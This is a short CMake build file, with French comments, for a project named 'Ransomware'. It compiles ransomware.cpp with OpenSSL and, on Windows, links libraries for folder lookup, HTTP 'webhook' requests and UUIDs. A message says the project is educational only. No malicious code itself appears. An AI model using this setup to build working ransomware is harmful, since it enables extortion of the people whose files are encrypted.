cmake_minimum_required(VERSION 3.10)
project(Ransomware)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Trouver OpenSSL
find_package(OpenSSL REQUIRED)
include_directories(${OPENSSL_INCLUDE_DIR})

# Compiler la version C++
add_executable(ransomware_cpp ransomware.cpp)
target_link_libraries(ransomware_cpp ${OPENSSL_LIBRARIES})

# Ajouter les options spécifiques à la plateforme Windows
if(WIN32)
    # Bibliothèques Windows nécessaires
    target_link_libraries(ransomware_cpp 
        shell32      # Pour SHGetFolderPath
        wininet      # Pour les requêtes HTTP (webhook)
        rpcrt4       # Pour la génération d'UUID
        ws2_32       # Pour les fonctions réseau
        crypt32      # Pour les fonctions de cryptographie Windows
    )
    
    # Ajouter des définitions pour supprimer les avertissements de dépréciation
    add_definitions(-D_CRT_SECURE_NO_WARNINGS)
    add_definitions(-D_SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING)
endif()

# Message d'information
message(STATUS "Projet Ransomware configuré. Utilisez 'cmake --build . --config Release' pour compiler.")
message(STATUS "AVERTISSEMENT: Ce programme est destiné uniquement à des fins éducatives!") 